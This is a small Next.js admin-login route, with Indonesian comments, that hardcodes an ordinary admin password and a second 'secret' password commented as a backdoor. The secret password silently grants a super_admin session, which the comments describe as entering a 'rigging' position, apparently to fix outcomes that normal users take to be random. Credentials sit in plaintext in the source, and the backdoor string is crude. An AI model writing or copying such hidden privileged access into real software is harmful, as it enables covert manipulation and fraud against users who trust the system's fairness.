import { NextRequest, NextResponse } from "next/server";
import { cookies } from "next/headers";

const ADMIN_PASSWORD = "NGACIR";
const SECRET_PASSWORD = "MR PENIS"; // 🤫 Password Backdoor

export async function POST(req: NextRequest) {
  const { password, action } = await req.json();

  const cookieStore = await cookies();

  if (action === "logout") {
    cookieStore.delete("adminAuth");
    return NextResponse.json({ success: true });
  }

  // Login normal -> acak 100%
  if (password === ADMIN_PASSWORD) {
    cookieStore.set("adminAuth", "admin", { httpOnly: true, path: "/" });
    return NextResponse.json({ success: true });
  }

  // Login backdoor -> langsung masuk posisi rigging
  if (password === SECRET_PASSWORD) {
    cookieStore.set("adminAuth", "super_admin", { httpOnly: true, path: "/" });
    return NextResponse.json({ success: true, isSuper: true });
  }

  return NextResponse.json({ success: false, error: "Password salah!" }, { status: 401 });
}
